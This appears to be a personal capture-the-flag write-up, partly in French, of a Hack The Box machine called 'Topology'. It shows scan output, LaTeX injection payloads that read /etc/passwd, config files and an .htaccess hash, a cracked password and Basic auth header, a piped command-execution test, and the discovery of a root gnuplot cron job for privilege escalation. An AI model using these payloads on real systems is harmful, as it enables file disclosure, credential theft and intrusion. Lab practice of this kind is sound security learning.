\chapter{Topology}
\begin{itemize}
\item{\bf technics}: latext injection, gnuplot
\item{\bf Components}:
\item{\bf tools}:
\end{itemize}


\section{nmap}
\begin{verbatim}
$nmapzi 10.10.11.217
TCPportsfound:22,80
StartingNmap7.94(https://nmap.org)at2023-06-1302:13CEST
Nmapscanreportfor10.10.11.217
iHostisup(0.050slatency).

PORTSTATESERVICEVERSION
22/tcpopensshOpenSSH8.2p1Ubuntu4ubuntu0.7(UbuntuLinux;protocol2.0)
|ssh-hostkey:
|3072dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6(RSA)
|256d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33(ECDSA)
|_2564c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7(ED25519)
80/tcpopenhttpApachehttpd2.4.41((Ubuntu))
|_http-server-header:Apache/2.4.41(Ubuntu)
|_http-title:MiskatonicUniversity|TopologyGroup
ServiceInfo:OS:Linux;CPE:cpe:/o:linux:linux_kernel


\end{verbatim}


\section{http}

\begin{verbatim}
http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B%2Fetc%2Fpasswd%7D%24&submit=


http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B..%2Fequation.php%7D%24&submit=
\end{verbatim}

\begin{verbatim}
else
{
    $texinput=$_GET['eqn'];
    $fi1terstrings=array("\\immediate","\\usepackage","\\input","\\write","\\loop","\\include","\\@","\\while","\\def","\\url","\\href");
    foreach($filterstrings as $filterstring){
        if(stripos($texinput,$filterstring)!==FALSE){
            $texinput="\$Illegal command detected.Sorry.\$";
            break;
    }
}
if(strlen($texinput)>=200){
    $texinput=""Input too long.Sorry.";
}
$errormsg="Something wentwrong.Sorry.";

// texfile content, insert default header and user input
$texsource="\\documentclass{standalone}
\\input{../header}
\\begin{document}
$" . $texinput . "$"."\\end{document}";

// create random filename
$fileid = uniqid(rand(),true);
$texfilename="tempfiles/" . $fileid. ".tex";
$texfile=fopen("$texfilename","w");
fputs($texfile,$texsource);
fclose($texfile);

chdir(dirname($texfilename));
exec("pdflatex" . basename($texfilename). ">/elev/null2>&1");

exec("convert -density 300" . $fileid . ".pdf" . "$fileid " . ".png>/dev/null2>&1");

$fp=fopen($fileid .".png", 'rb');
header("Content-Type:image/png");
header("Content-Length:" . filesize($fileid.".png"));

fpassthru($fp);
//delete temp image 
fclose($fp);
exec("rm -f " . $fileid. ".*");
exit;
}

\end{verbatim}

dans header on a:
\begin{itemize}
    \item inputenc
    \item graphicx
    \item eurosym
    \item times
    \item listings
    \item hyperref
    \item mathtools amssymb, amsthm
    \item mathptmx
\end{itemize}



\begin{verbatim}
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://topology.htb -H "Host: FUZZ.topology.htb"  -fs 6767


 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 6767

dev                     [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 212ms]
stats                   [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 294ms]

\end{verbatim}

\begin{verbatim}
$\lstinputlisting{/etc/apache2/apache2.conf}$

$\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
/var/www/dev
/var/www/latex
/var/www/stats

$\lstinputlisting{/var/www/dev/.htaccess}$
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

(jubeaz@akamatsu):[~/documents/pentesting-games/htb/topology]
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)
1g 0:00:00:07 DONE (2023-06-13 04:11) 0.1302g/s 129750p/s 129750c/s 129750C/s calebb07..bzmann
Use the "--show" option to display all of the cracked passwords reliably
Session completed

\end{verbatim}



\begin{verbatim}
Authorization: 	Basic dmRhaXNsZXk6Y2FsY3VsdXMyMA==
\end{verbatim}


\href{https://tex.stackexchange.com/questions/500463/using-listinputlisting-to-include-a-specific-git-commit}{on peut RCE} mais il faut une option de pdflatex

\begin{verbatim}
$\lstinputlisting{|"ping -c 4 10.10.16.2"}$


$ sudo tcpdump -i tun0 -Q in
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
05:41:40.237515 IP dev.topology.htb.http > akamatsu.53106: Flags [S.], seq 573235260, ack 1897447146, win 65160, options [mss 1338,sackOK,TS val 1788077782 ecr 2816942447,nop,wscale 7], length 0
05:41:40.292830 IP dev.topology.htb.http > akamatsu.53106: Flags [.], ack 567, win 505, options [nop,nop,TS val 1788077838 ecr 2816942477], length 0
05:41:40.597495 IP dev.topology.htb.http > akamatsu.53106: Flags [P.], seq 1:152, ack 567, win 505, options [nop,nop,TS val 1788078133 ecr 2816942477], length 151: HTTP: HTTP/1.1 200 OK
05:41:40.624897 IP dev.topology.htb.http > akamatsu.53106: Flags [F.], seq 152, ack 567, win 505, options [nop,nop,TS val 1788078133 ecr 2816942477], length 0
05:41:40.705789 IP dev.topology.htb.http > akamatsu.53106: Flags [.], ack 568, win 505, options [nop,nop,TS val 1788078250 ecr 2816942864], length 0
\end{verbatim}


password reuse

\section{vdaisley}
\begin{verbatim}
$ ssh vdaisley@topology.htb
Last login: Wed Jun 14 00:07:13 2023 from 10.10.16.3
-bash-5.0$

\end{verbatim}
pspy64:
\begin{verbatim}
2023/06/14 01:54:01 CMD: UID=0     PID=78133  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
2023/06/14 01:55:01 CMD: UID=0     PID=78146  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
2023/06/14 01:55:01 CMD: UID=0     PID=78145  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;


\end{verbatim}

linpeas:
\begin{verbatim}
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/vdaisley
/opt/gnuplot

\end{verbatim}


\href{https://www.bersch.net/gnuplot-doc/system.html}{gnuplot system command}

